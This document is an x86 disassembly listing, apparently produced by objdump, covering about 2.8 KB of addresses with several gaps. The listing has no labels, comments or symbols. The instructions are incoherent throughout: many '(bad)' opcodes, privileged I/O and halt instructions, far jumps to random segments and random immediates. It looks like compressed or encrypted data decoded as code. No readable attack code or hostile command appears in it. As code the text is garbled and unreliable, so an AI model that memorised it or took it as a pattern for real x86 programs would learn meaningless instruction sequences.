  42537b:	and    DWORD PTR [eax+0x4ae6a4b0],ecx
  425381:	inc    ebp
  425382:	dec    ecx
  425383:	mov    ch,0x32
  425385:	or     DWORD PTR [ecx-0x3],ecx
  425388:	add    ch,bh
  42538a:	cmp    al,0x24
  42538c:	addr16 or cl,0xc6
  425390:	push   edx
  425391:	cdq    
  425392:	retf   
  425393:	xor    BYTE PTR [esi-0x32],ch
  425396:	lock imul ecx,DWORD PTR [eax+0x61959748],0xffffffc3
  42539e:	sbb    edi,DWORD PTR [ebx]
  4253a0:	inc    edx
  4253a1:	add    eax,0x5f21c9b0
  4253a6:	mov    ebp,0x1df048c7
  4253ab:	call   0x5b51:0x2ab76d9f
  4253b2:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4253b4:	mov    BYTE PTR [eax],ch
  4253b6:	lods   al,BYTE PTR ds:[esi]
  4253b7:	mov    ebx,0x5651ac86
  4253bc:	pop    eax
  4253bd:	in     eax,0xda
  4253bf:	sub    al,ch
  4253c1:	sbb    ecx,DWORD PTR ds:0x35e3e499
  4253c7:	aad    0x21
  4253c9:	gs aad 0x7b
  4253cc:	enter  0x2891,0xcb
  4253d0:	or     al,0xfc
  4253d2:	xchg   DWORD PTR [edi],esi
  4253d4:	int3   
  4253d5:	xor    DWORD PTR cs:0xe18e8d5f,0x946f45f7
  4253e0:	mov    al,ds:0x6bdf664b
  4253e5:	xchg   ebp,eax
  4253e6:	iret   
  4253e7:	shl    BYTE PTR ds:0xe87241bb,0xd5
  4253ee:	fwait
  4253ef:	mov    WORD PTR [eax-0x74],ss
  4253f2:	call   0x57b68cf0
  4253f7:	pop    edi
  4253f8:	pop    es
  4253f9:	adc    BYTE PTR [bx+di-0x6192],ah
  4253fe:	add    bh,dl
  425400:	push   esi
  425401:	mov    ?,WORD PTR [eax+0x52d7358a]
  425407:	sbb    eax,0xf0b746d2
  42540c:	and    al,0xe4
  42540e:	ins    BYTE PTR es:[edi],dx
  42540f:	cdq    
  425410:	outs   dx,DWORD PTR ds:[esi]
  425411:	cmp    BYTE PTR [ebx],dh
  425413:	mov    eax,ds:0x897c7a45
  425418:	je     0x42544f
  42541a:	nop
  42541b:	or     DWORD PTR [eax],ebx
  42541d:	adc    eax,0xaf2bfeac
  425422:	sti    
  425423:	sub    BYTE PTR [edx-0x29],dh
  425426:	push   esi
  425427:	pop    esi
  425428:	adc    eax,0x4a5cb77c
  42542d:	inc    eax
  42542e:	popa   
  42542f:	repnz lods eax,DWORD PTR ds:[esi]
  425431:	push   esi
  425432:	cmp    eax,0x40342e2c
  425437:	fs not cl
  42543a:	mov    esi,0xb76ed855
  42543f:	ret    
  425440:	dec    esi
  425441:	inc    esi
	...
  4254b2:	add    BYTE PTR [eax],al
  4254b4:	loopne 0x425525
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	cli    
  4254c1:	add    esi,DWORD PTR [esi+0x6a]
  4254c4:	mov    dh,0x8d
  4254c6:	add    DWORD PTR [eax],eax
  4254c8:	test   BYTE PTR [eax],0x0
  4254cb:	add    BYTE PTR [esi-0x15],al
  4254ce:	and    eax,0x46f33f48
  4254d3:	sbb    al,0xb0
  4254d5:	bts    DWORD PTR [ecx+0x5c],edx
  4254d9:	cmp    DWORD PTR [edx-0x6dadc8ae],edi
  4254df:	pop    edx
  4254e0:	test   eax,0x61915140
  4254e5:	cwde   
  4254e6:	pop    edx
  4254e7:	loop   0x42552e
  4254e9:	adc    DWORD PTR [ecx],0xffffffb7
  4254ec:	dec    ebp
  4254ed:	ins    BYTE PTR es:[edi],dx
  4254ee:	ret    
  4254ef:	fsin   
  4254f1:	mov    ebx,0x51507062
  4254f6:	into   
  4254f7:	lods   eax,DWORD PTR ds:[esi]
  4254f8:	or     BYTE PTR [esi+0x56ba94ad],0x7f
  4254ff:	and    DWORD PTR ds:0xc82ca1eb,0xffffffd5
  425506:	stc    
  425507:	mov    ebx,0x702e1b3c
  42550c:	call   FWORD PTR [edx-0x1254db7f]
  425512:	mov    ebp,0x9ec8dadb
  425517:	lods   eax,DWORD PTR ds:[esi]
  425518:	ins    DWORD PTR es:[edi],dx
  425519:	aas    
  42551a:	fistp  WORD PTR es:[edx+0x47]
  42551e:	out    dx,eax
  42551f:	rol    BYTE PTR [edx-0x28bcfbfa],1
  425525:	ret    
  425526:	in     eax,0xd5
  425528:	repnz ror BYTE PTR [ebx+0x21d32682],0x8c
  425530:	arpl   WORD PTR [ebx+0x62a15395],ax
  425536:	jb     0x425530
  425538:	push   eax
  425539:	and    bh,BYTE PTR [edi+0x6b]
  42553c:	mov    al,0x76
  42553e:	cmc    
  42553f:	or     BYTE PTR [edx-0x7597f0a2],al
  425545:	push   ebx
  425546:	cmp    DWORD PTR [eax+ecx*8],edi
  425549:	into   
  42554a:	clc    
  42554b:	pop    es
  42554c:	not    BYTE PTR [edi-0x57]
  42554f:	ret    
  425550:	push   edi
  425551:	icebp  
  425552:	jb     0x4254dd
  425554:	aam    0x30
  425556:	mov    esi,0xe12ad76e
  42555b:	inc    eax
  42555c:	in     eax,0xb8
  42555e:	dec    eax
  425560:	xchg   ebp,eax
  425561:	hlt    
  425562:	pop    edi
  425564:	mov    ebp,0x9da30c2f
  425569:	inc    esi
  42556a:	mov    ds:0x57a64d9f,al
  42556f:	mov    ebp,0xba91ed57
  425574:	lods   eax,DWORD PTR ds:[esi]
  425575:	xchg   edi,eax
  425576:	pop    ebp
  425577:	jno    0x42552c
  425579:	lods   eax,DWORD PTR ds:[esi]
  42557a:	sbb    al,0xa7
  42557c:	and    ch,BYTE PTR fs:[esi-0x47748ed2]
  425583:	pop    es
  425584:	jg     0x4255a6
  425586:	xor    edx,DWORD PTR [eax]
  425588:	das    
  425589:	div    BYTE PTR [esi-0x3e0f22af]
  42558f:	lods   eax,DWORD PTR ds:[esi]
  425590:	std    
  425591:	adc    BYTE PTR [ecx-0x33],bh
  425594:	push   cs
  425595:	push   esi
  425596:	fimul  DWORD PTR [ebx+0x10714472]
  42559c:	jecxz  0x42560f
  42559e:	or     BYTE PTR [ebx+0xc],ch
  4255a1:	(bad)
  4255a5:	imul   ecx,DWORD PTR [edx+esi*2+0x61],0xffffff80
  4255aa:	popf   
  4255ab:	imul   ebp,DWORD PTR [eax],0xffffffe5
  4255ae:	dec    esp
  4255af:	add    eax,0x30e27aba
  4255b4:	add    DWORD PTR [ecx+0x6a],ecx
  4255b7:	sub    esp,DWORD PTR [ebp+0x1d]
  4255ba:	fs pop es
  4255bc:	jmp    0x4c:0x4c5d84bb
	...
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	out    dx,al
  425641:	or     edx,DWORD PTR [ebx-0x3c]
  425644:	lods   al,BYTE PTR ds:[esi]
  425645:	mov    es,WORD PTR [ecx]
  425647:	add    dh,dh
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [esi+0x67],ah
  42564e:	sub    bh,dl
  425650:	addr16 (bad) 
  425653:	and    edx,esi
  425655:	mov    bl,0x47
  425657:	in     eax,dx
  425658:	fcomp  DWORD PTR [esi+0x1178ed98]
  42565e:	sahf   
  42565f:	pop    esp
  425660:	cmp    ecx,DWORD PTR [ebp+0x4758ec54]
  425666:	ss enter 0x3b79,0x6
  42566b:	leave  
  42566c:	adc    BYTE PTR [edx],bl
  42566e:	fst    st(5)
  425670:	sbb    ah,BYTE PTR [ebx-0x72]
  425673:	sbb    eax,0x7008c05f
  425678:	(bad)  
  425679:	call   0xac2c1caa
  42567e:	push   ss
  42567f:	mov    eax,ebp
  425681:	push   esi
  425683:	in     eax,dx
  425684:	pusha  
  425685:	aaa    
  425686:	sbb    esi,ecx
  425688:	mov    edx,0x4bd24419
  42568d:	adc    esi,eax
  42568f:	outs   dx,DWORD PTR ds:[esi]
  425690:	rcl    DWORD PTR [ecx-0x4d8b6e1c],cl
  425696:	(bad)  
  425697:	mov    eax,0xd7bb5664
  42569c:	js     0x4256c7
  42569e:	xor    al,0xb4
  4256a0:	scas   eax,DWORD PTR es:[edi]
  4256a1:	ret    0xfa49
  4256a4:	pop    edi
  4256a5:	mov    ebp,0x550ba1fd
  4256aa:	sti    
  4256ab:	iret   
  4256ac:	ja     0x425670
  4256ae:	and    al,BYTE PTR [ecx+ebp*2]
  4256b1:	cmp    eax,0xcc83c358
  4256b6:	pop    ebp
  4256b7:	adc    BYTE PTR [edi+0x78ea6e02],ch
  4256bd:	jge    0x4256de
  4256bf:	jo     0x4256b1
  4256c1:	loop   0x42567f
  4256c3:	or     DWORD PTR [esi-0x8f72fce],edi
  4256c9:	in     al,dx
  4256ca:	xor    bh,BYTE PTR ds:0x7112d43f
  4256d0:	fwait
  4256d1:	sub    DWORD PTR [edi+0x4afca6a7],edx
  4256d7:	ror    DWORD PTR [esi+0x62],0xae
  4256db:	push   es
  4256dc:	cdq    
  4256dd:	cmp    BYTE PTR [esi-0x76],al
  4256e0:	out    dx,al
  4256e1:	ficomp WORD PTR [edx+0x2]
  4256e4:	mov    cl,0x79
  4256e6:	(bad)  [eax-0x62]
  4256e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4256ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4256eb:	shl    DWORD PTR [esi],cl
  4256ed:	jmp    0xc117865a
  4256f2:	sbb    BYTE PTR [ebp+0xb],ah
  4256f5:	mov    ds:0x9b67a1f0,al
  4256fa:	popf   
  4256fb:	int    0x5e
  4256fd:	jno    0x425704
  4256ff:	dec    esi
  425700:	jbe    0x4256ba
  425702:	push   ebx
  425703:	inc    esp
  425704:	xor    BYTE PTR [edx+eax*1+0x466931c5],ah
  42570b:	ins    BYTE PTR es:[edi],dx
  42570c:	pusha  
  42570d:	adc    bh,BYTE PTR [ebp+0x13]
  425710:	and    ebx,DWORD PTR [ebx]
  425712:	sbb    eax,0x580612c7
  425717:	dec    ebp
  425718:	mov    al,0xec
  42571a:	mov    WORD PTR [edx-0x1],es
  42571d:	lock push ebx
  42571f:	or     DWORD PTR ds:0xfdc18eb3,edx
  425725:	cmp    eax,0xfcd4deb
  42572a:	jge    0x425789
  42572c:	cwde   
  42572d:	imul   eax,ecx,0x309f1659
  425733:	mov    dh,ch
  425735:	pop    eax
  425736:	mov    WORD PTR [eax],es
  425738:	jl     0x42579d
  42573a:	outs   dx,DWORD PTR ds:[esi]
  42573b:	mov    eax,0xc6e56e6d
  425740:	adc    al,bh
	...
  4257b2:	add    BYTE PTR [eax],al
  4257b4:	and    bl,BYTE PTR [eax-0x7c]
  4257b7:	out    dx,eax
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	ins    BYTE PTR es:[edi],dx
  4257c1:	sahf   
  4257c2:	cs aaa 
  4257c4:	mov    ds:0xf600018f,al
  4257c9:	add    BYTE PTR [eax],al
  4257cb:	add    BYTE PTR [esp+eax*1],ch
  4257ce:	vpacksswb ymm5,ymm2,ymm0
  4257d2:	retf   
  4257d3:	or     al,0xa9
  4257d5:	push   esp
  4257d6:	div    ch
  4257d8:	sbb    al,0x5b
  4257da:	adc    esi,DWORD PTR [ebx+edx*8+0x2214ab42]
  4257e1:	leave  
  4257e2:	data16 loopne 0x4257f1
  4257e5:	lock ret 
  4257e7:	stc    
  4257e8:	sar    DWORD PTR [eax-0x7e17a991],0xc4
  4257ef:	outs   dx,BYTE PTR ds:[esi]
  4257f0:	xchg   BYTE PTR [edx+0x594e1a6a],bl
  4257f6:	pushf  
  4257f7:	sub    ch,bl
  4257f9:	mov    edx,0xdc274778
  4257fe:	add    cl,dl
  425800:	fist   WORD PTR [esi+0x715d1ccd]
  425806:	loop   0x425872
  425808:	mov    ds:0x60085b8a,eax
  42580d:	or     ebx,edx
  42580f:	into   
  425810:	int    0x8c
  425812:	add    esp,DWORD PTR [esi]
  425814:	dec    edi
  425815:	in     al,0x4f
  425817:	push   ds
  425818:	lahf   
  425819:	js     0x4257f9
  42581b:	repz test BYTE PTR [eax+0x1fda0618],ch
  425822:	jae    0x4257a4
  425824:	jl     0x4257e9
  425826:	push   0xffffff97
  425828:	pop    es
  425829:	in     eax,dx
  42582a:	(bad)  [eax-0x2b]
  42582d:	lea    eax,[ebx-0x20]
  425830:	jmp    0xb1b5:0xb5ef4b50
  425837:	xchg   ebx,eax
  425838:	and    al,0xb2
  42583a:	pop    ebp
  42583b:	ret    0xcedc
  42583e:	test   eax,0x82f18923
  425843:	mov    bl,0x44
  425845:	xchg   esi,eax
  425846:	pushf  
  425847:	mov    ?,WORD PTR [edi]
  425849:	lahf   
  42584a:	xchg   esp,eax
  42584b:	and    eax,0x9b6da744
  425850:	sbb    dl,BYTE PTR [ecx-0x3f]
  425853:	adc    cl,BYTE PTR [ecx]
  425855:	aam    0x8f
  425857:	cld    
  425858:	js     0x425852
  42585a:	inc    dl
  42585c:	test   DWORD PTR [esi-0x68],edx
  42585f:	in     eax,dx
  425860:	xchg   esi,eax
  425861:	loopne 0x425830
  425863:	rol    DWORD PTR [edx],1
  425865:	jns    0x4258d6
  425867:	shl    esp,0xb6
  42586a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42586b:	lahf   
  42586c:	sub    DWORD PTR [edx],ebp
  42586e:	test   eax,0x69f7b659
  425873:	xchg   ebx,eax
  425874:	das    
  425875:	add    BYTE PTR [eax+eiz*8],dl
  425878:	fucomip st,st(4)
  42587a:	or     al,0xf6
  42587c:	jne    0x425876
  42587e:	adc    al,dl
  425880:	jne    0x425809
  425882:	cmp    DWORD PTR [ebx+0x13dfeada],edx
  425888:	(bad)  
  425889:	push   esi
  42588a:	push   ss
  42588b:	xor    DWORD PTR [edi-0x51f9b94d],ebx
  425891:	mov    DWORD PTR [esi+0x58],0x7fb0567f
  425898:	in     al,dx
  425899:	cmc    
  42589a:	and    eax,0xc50a50cb
  42589f:	sti    
  4258a0:	cli    
  4258a1:	push   0x31
  4258a3:	mov    al,ds:0x668c2c2a
  4258a8:	pop    esi
  4258a9:	mov    ds:0xd4d5b1fa,eax
  4258ae:	std    
  4258af:	cmp    ch,BYTE PTR [ecx-0x30]
  4258b2:	loope  0x4258e0
  4258b4:	and    eax,0x757011a3
  4258b9:	stc    
  4258ba:	add    al,0xe8
  4258bc:	cli    
  4258bd:	sbb    al,0x2e
  4258bf:	fild   DWORD PTR [ebx]
  4258c1:	push   ecx
	...
  425932:	add    BYTE PTR [eax],al
  425934:	imul   ebx,DWORD PTR [eax],0x63
  425937:	push   0x73
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	mov    ah,0x4e
  425942:	xlat   BYTE PTR ds:[ebx]
  425943:	sub    eax,0x19098
  425948:	test   BYTE PTR [eax],0x0
  42594b:	add    BYTE PTR [ecx-0x1],dh
  42594e:	mov    DWORD PTR [eax+0x1906d0ec],esi
  425954:	pop    ecx
  425955:	jae    0x4259ce
  425957:	sti    
  425958:	inc    esi
  425959:	and    edi,DWORD PTR [ecx-0x27]
  42595c:	inc    ebp
  42595d:	ss ss (bad) 
  425960:	fistp  DWORD PTR [ebx+0x3a5df096]
  425966:	(bad)  
  425967:	jns    0x4258f6
  425969:	xor    al,0x35
  42596b:	and    al,ch
  42596d:	cmp    al,0x35
  42596f:	add    dh,0x9d
  425972:	and    DWORD PTR [eax+ecx*1],esp
  425975:	out    0x70,al
  425977:	push   esp
  425978:	and    BYTE PTR [esi+0x61eeb551],bh
  42597e:	push   ds
  42597f:	fdiv   st,st(2)
  425981:	cmp    eax,0xc20afef2
  425986:	push   ds
  425987:	mov    esp,0x4e822418
  42598c:	je     0x6a9c653a
  425992:	xor    DWORD PTR [eax+0x194d9741],esi
  425998:	stos   BYTE PTR es:[edi],al
  425999:	or     edi,esp
  42599b:	push   0xffffffd6
  42599d:	outs   dx,BYTE PTR ds:[esi]
  42599e:	lea    ebx,[ebx*2-0x4c02d7ed]
  4259a5:	mov    eax,0x8125cf65
  4259aa:	mov    ds:0xc462669c,eax
  4259af:	stos   DWORD PTR es:[edi],eax
  4259b0:	adc    eax,0x70581d0a
  4259b5:	xchg   edi,eax
  4259b6:	fmul   st,st(3)
  4259b8:	inc    ebx
  4259b9:	mov    al,ds:0x4a190fb0
  4259be:	jnp    0x4259f7
  4259c0:	scas   eax,DWORD PTR es:[edi]
  4259c1:	mov    ch,0xe7
  4259c3:	popa   
  4259c4:	xchg   edx,eax
  4259c5:	mov    edi,0x9d31ae8a
  4259ca:	push   fs
  4259cc:	scas   eax,DWORD PTR es:[edi]
  4259cd:	cmp    DWORD PTR [ebx-0x1079f59a],ecx
  4259d3:	iret   
  4259d4:	pusha  
  4259d5:	in     al,dx
  4259d6:	test   BYTE PTR [edx],0x9f
  4259d9:	or     al,0xcd
  4259db:	aas    
  4259dc:	jno    0x425979
  4259de:	or     dl,BYTE PTR [eax-0x58]
  4259e1:	push   ds
  4259e2:	sbb    edi,DWORD PTR [ecx]
  4259e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4259e5:	xchg   esi,edx
  4259e7:	pop    edx
  4259e8:	or     edx,esp
  4259ea:	push   0xa7fc2dc9
  4259ef:	lds    eax,FWORD PTR [edi]
  4259f1:	fwait
  4259f2:	add    al,bl
  4259f4:	push   si
  4259f6:	jmp    0x425a64
  4259f8:	inc    esp
  4259f9:	icebp  
  4259fa:	sbb    al,0x3f
  4259fc:	or     DWORD PTR [ecx],ebx
  4259fe:	(bad)  
  425a00:	and    eax,0x24290da1
  425a05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a06:	pop    edx
  425a07:	xor    eax,0x62faf811
  425a0c:	adc    edi,DWORD PTR [edi]
  425a0e:	or     BYTE PTR [ebp+0x7c2b647b],bh
  425a14:	sub    DWORD PTR [ecx],esi
  425a16:	stos   DWORD PTR es:[edi],eax
  425a17:	sub    eax,0xbf79c29
  425a1c:	fdiv   DWORD PTR ds:0xc627c285
  425a22:	xchg   ecx,eax
  425a23:	mov    bl,0x2d
  425a25:	cs pop ebp
  425a27:	(bad)  
  425a28:	jnp    0x4259ae
  425a2a:	mov    edi,edi
  425a2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a2d:	dec    ebp
  425a2e:	loopne 0x425a97
  425a30:	or     BYTE PTR [esi-0x60],al
  425a33:	xor    eax,0x8df1bf7f
  425a38:	xor    DWORD PTR [eax+0x4145f1d],ebp
  425a3e:	fistp  WORD PTR [ebx+0x7520]
	...
  425ab4:	push   es
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	add    eax,0x8e0a0408
  425ac5:	xchg   ecx,eax
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	test   BYTE PTR [eax],0x0
  425acb:	add    BYTE PTR [esp+edi*4+0x2cd15824],dh
  425ad2:	mov    edi,0x7a642b7b
  425ad7:	pushf  
  425ad8:	pop    esp
  425ad9:	inc    ecx
  425ada:	je     0x425ad9
  425adc:	jb     0x634cb56b
  425ae2:	mov    al,0x1f
  425ae4:	retf   0x7e73
  425ae7:	pop    edi
  425ae8:	sbb    esp,DWORD PTR [esi+0x2]
  425aeb:	(bad)  
  425aec:	dec    ecx
  425aed:	pop    es
  425aee:	mov    ebp,0xb26d0dcf
  425af3:	ja     0x425b53
  425af5:	jnp    0x425aea
  425af7:	lds    ax,DWORD PTR [edi]
  425afa:	jge    0x425a8c
  425afc:	mov    al,ds:0x3a3d4124
  425b01:	(bad)  
  425b02:	data16 mov al,0xbd
  425b05:	aas    
  425b06:	icebp  
  425b07:	fs dec edi
  425b09:	loopne 0x425b15
  425b0b:	int    0xb1
  425b0d:	es cwde 
  425b0f:	dec    eax
  425b10:	jg     0x425b4a
  425b12:	retf   0x2624
  425b15:	inc    edi
  425b16:	cdq    
  425b17:	mov    ds:0x6c7a58cb,eax
  425b1c:	sub    DWORD PTR [ecx-0x2d],ebx
  425b1f:	jb     0x425b25
  425b21:	jb     0x425aed
  425b23:	cmp    dh,cl
  425b25:	jmp    0x425aae
  425b27:	dec    edi
  425b28:	sar    BYTE PTR [edi+0x10],1
  425b2b:	and    cl,BYTE PTR ss:[edi]
  425b2e:	stos   DWORD PTR es:[edi],eax
  425b2f:	into   
  425b30:	jo     0x425b97
  425b32:	jp     0x425b6a
  425b34:	loopne 0x425b7d
  425b36:	psadbw mm5,QWORD PTR [edx+0x25]
  425b3a:	div    DWORD PTR [edi+esi*8-0x39]
  425b3e:	repnz pop edi
  425b40:	mov    edi,0x73a38060
  425b45:	shl    BYTE PTR ds:[esp+ebp*1],0xaa
  425b4a:	and    eax,0x46fd32b7
  425b4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b50:	inc    eax
  425b51:	mov    edx,0x899bee6
  425b56:	push   cs
  425b57:	retf   
  425b58:	aam    0x5
  425b5a:	(bad)  
  425b5b:	jmp    FWORD PTR [ebx]
  425b5d:	sti    
  425b5e:	cmp    ebp,DWORD PTR [ebx+0x30]
  425b61:	or     ch,BYTE PTR [esi]
  425b63:	(bad)  [edx-0x2fb39c06]
  425b69:	pop    ecx
  425b6a:	cmc    
  425b6b:	addr16 mov al,ds:0xa4a9
  425b6f:	cmp    DWORD PTR ds:0x623cb226,eax
  425b75:	mov    eax,0x6e0b23d4
  425b7a:	xchg   DWORD PTR [ebp-0x3fdde3c],esp
  425b80:	pusha  
  425b81:	xchg   eax,ecx
  425b83:	int    0x30
  425b85:	mov    dh,0xca
  425b87:	xchg   esp,eax
  425b88:	das    
  425b89:	sub    BYTE PTR [edx-0x5b607d31],dl
  425b8f:	test   al,0xa0
  425b91:	out    0xac,al
  425b93:	xchg   DWORD PTR [ebx],eax
  425b95:	xor    edi,DWORD PTR [ebx+0x268c61c]
  425b9b:	dec    ebp
  425b9c:	sahf   
  425b9d:	sbb    al,ch
  425b9f:	sbb    eax,DWORD PTR [eax]
  425ba1:	pop    eax
  425ba2:	inc    ebp
  425ba3:	hlt    
  425ba4:	and    ah,BYTE PTR [eax-0x5c4f6267]
  425baa:	mov    eax,0xc6337873
  425baf:	fwait
  425bb0:	hlt    
  425bb1:	(bad)  
  425bb2:	int    0xc7
  425bb4:	mov    ebp,0x1718b9a4
  425bb9:	mov    al,0xa6
  425bbb:	(bad)  
  425bbc:	sub    al,0xb4
  425bbe:	inc    edi
  425bbf:	mov    ecx,DWORD PTR [esp+edx*2+0x0]
	...
  425c33:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  425c37:	push   0xffffffb6
  425c39:	outs   dx,BYTE PTR ds:[esi]
  425c3a:	(bad)  
  425c3b:	fdivp  st(2),st
  425c3d:	sub    ch,cl
  425c3f:	call   0x9284:0xf782799
  425c46:	add    DWORD PTR [eax],eax
  425c48:	test   BYTE PTR [eax],0x0
  425c4b:	add    BYTE PTR [esi+0xd3ca832],bh
  425c51:	sbb    BYTE PTR [ecx+0x7d21fe70],0x15
  425c58:	stc    
  425c59:	cmp    DWORD PTR [esi+0x66],edi
  425c5c:	xor    ch,bh
  425c5e:	or     esi,DWORD PTR [edx-0x71]
  425c61:	ins    BYTE PTR es:[edi],dx
  425c62:	mov    ebx,0xa27cc351
  425c67:	mov    eax,ds:0xe5d4b1e1
  425c6c:	gs sub al,0xf2
  425c6f:	mov    dh,BYTE PTR [ebp-0x2d]
  425c72:	sub    BYTE PTR [ecx-0x7cd5569e],al
  425c78:	test   dl,dl
  425c7a:	cmc    
  425c7b:	imul   ebp,DWORD PTR [eax+0x556e0de0],0x76
  425c82:	push   edx
  425c83:	ss pusha 
  425c85:	add    BYTE PTR [edi+0x40d80672],dl
  425c8b:	gs dec ebp
  425c8d:	jbe    0x425ca8
  425c8f:	arpl   WORD PTR [ebx+0x24],si
  425c92:	push   0x1b462b4
  425c97:	mov    ss,WORD PTR [ebx]
  425c99:	adc    esp,DWORD PTR [edi]
  425c9b:	out    dx,eax
  425c9c:	and    BYTE PTR [eax+0x55],al
  425c9f:	stos   DWORD PTR es:[edi],eax
  425ca0:	xchg   ebp,eax
  425ca1:	jecxz  0x425cd9
  425ca3:	jnp    0x425ce5
  425ca5:	imul   BYTE PTR [edx-0x71]
  425ca8:	fwait
  425ca9:	repnz loopne 0x425cc8
  425cac:	outs   dx,DWORD PTR ds:[esi]
  425cad:	jmp    0x95a9:0x6cad5998
  425cb4:	push   eax
  425cb5:	fxch   st(3)
  425cb7:	jae    0x425d27
  425cb9:	jle    0x425c48
  425cbb:	xlat   BYTE PTR ds:[ebx]
  425cbc:	into   
  425cbd:	call   0xb0ea0866
  425cc2:	scas   eax,DWORD PTR es:[edi]
  425cc3:	inc    edi
  425cc4:	int    0x9
  425cc6:	fisubr WORD PTR [eiz*4+0x1f15df02]
  425ccd:	adc    eax,0xc51e167f
  425cd2:	and    al,0x4c
  425cd4:	adc    DWORD PTR [edi-0x5860b5ef],0x2d1573ec
  425cde:	jmp    0x614a:0x5b10075b
  425ce5:	inc    ecx
  425ce6:	and    ah,ah
  425ce8:	dec    ebp
  425ce9:	push   0x2b91d5f
  425cee:	push   edi
  425cef:	pop    edi
  425cf0:	pop    ebx
  425cf1:	popa   
  425cf2:	stos   DWORD PTR es:[edi],eax
  425cf3:	xor    eax,0x7b9073a2
  425cf8:	aad    0x90
  425cfa:	push   esi
  425cfb:	popa   
  425cfc:	inc    ebx
  425cfd:	mov    edi,DWORD PTR [esi+0x12]
  425d00:	pop    esi
  425d01:	ins    BYTE PTR es:[edi],dx
  425d02:	leave  
  425d03:	imul   edx,DWORD PTR [ebp+0x57],0xf
  425d07:	dec    ebx
  425d08:	jmp    0x352c3925
  425d0d:	sbb    ebp,0x89d4af93
  425d13:	inc    edi
  425d14:	sbb    BYTE PTR [esi+edx*2],cl
  425d17:	jmp    0x9f418ba9
  425d1c:	lods   al,BYTE PTR ds:[esi]
  425d1d:	sbb    eax,0xa4f653db
  425d22:	scas   al,BYTE PTR es:[edi]
  425d23:	fld    st(2)
  425d25:	and    edx,ebp
  425d27:	ficom  DWORD PTR [ebx]
  425d29:	sbb    eax,DWORD PTR [ecx+0x6d6ae71a]
  425d2f:	xor    bh,BYTE PTR [ebp-0x3a]
  425d32:	shr    DWORD PTR [edx+edx*4],cl
  425d35:	xor    eax,0x91fb631f
  425d3a:	xor    eax,0x5ab2d2aa
  425d3f:	cmp    DWORD PTR [eax+0x45],ecx
	...
  425db1:	add    BYTE PTR [eax],al
  425db3:	add    BYTE PTR ds:0xf361d20c,bh
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	dec    edx
  425dc1:	je     0x425df3
  425dc3:	jne    0x425e3f
  425dc5:	xchg   ebx,eax
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	test   BYTE PTR [eax],0x0
  425dcb:	add    ch,ch
  425dcd:	test   DWORD PTR [eax-0x6c7027b7],esp
  425dd3:	rol    BYTE PTR [eax],1
  425dd5:	push   ds
  425dd6:	int    0xab
  425dd8:	aaa    
  425dd9:	lods   al,BYTE PTR ds:[esi]
  425dda:	sahf   
  425ddb:	call   0xc896:0xddec8308
  425de2:	xor    al,0x54
  425de4:	mov    esi,0x56f6e5cb
  425de9:	jle    0x425db2
  425deb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dec:	fs mov bh,0x89
  425def:	lock mov dh,0x68
  425df2:	fcomp  DWORD PTR [ebx+ebp*2-0x6dc37ac6]
  425df9:	xchg   ebx,eax
  425dfa:	cmp    al,0x65
  425dfc:	jge    0x425d82
  425dfe:	sub    bl,BYTE PTR [esi+0x48]
  425e01:	call   0xd5bc4da3
  425e06:	jno    0x425de0
  425e08:	inc    ebx
  425e09:	mov    dl,0x3b
  425e0b:	push   ss
  425e0c:	inc    esp
  425e0d:	scas   eax,DWORD PTR es:[edi]
  425e0e:	sti    
  425e0f:	rcl    DWORD PTR [esi],1
  425e11:	nop
  425e12:	inc    edx
  425e13:	dec    edx
  425e14:	xor    DWORD PTR [eax+0xe5ff3a],esp
  425e1a:	xchg   ebx,eax
  425e1b:	sub    al,0xf3
  425e1d:	add    eax,0x1dc9eca
  425e22:	nop
  425e23:	(bad)
  425e26:	fdiv   DWORD PTR [esi-0x69]
  425e29:	cmp    al,0xeb
  425e2b:	mov    eax,0x8d1c9d89
  425e30:	ja     0x425dc7
  425e32:	cli    
  425e33:	inc    esp
  425e34:	mov    eax,0x11623ccd
  425e39:	push   ds
  425e3a:	mov    ebp,DWORD PTR [edi]
  425e3c:	xlat   BYTE PTR ds:[ebx]
  425e3d:	retf   
  425e3e:	mov    al,0x66
  425e40:	push   ss
  425e41:	adc    bl,cl
  425e43:	or     al,0x36
  425e45:	fcom   st(3)
  425e47:	xchg   esp,eax
  425e48:	mov    esp,0x8ef6db7e
  425e4d:	(bad)  
  425e4e:	imul   ecx,DWORD PTR [edi+esi*8],0x5f68bb6
  425e55:	retf   
  425e56:	sub    BYTE PTR [edi],bh
  425e58:	mov    dh,0x34
  425e5a:	mov    cl,0x3e
  425e5c:	enter  0x953e,0x1d
  425e60:	pusha  
  425e61:	adc    DWORD PTR [ebx+0x5bec0914],edx
  425e67:	inc    ebx
  425e68:	mov    ebx,ebx
  425e6a:	and    BYTE PTR [ecx+edx*1+0x5aedaa37],cl
  425e71:	repnz rol DWORD PTR [eax-0x14],0xd9
  425e76:	jne    0x425e46
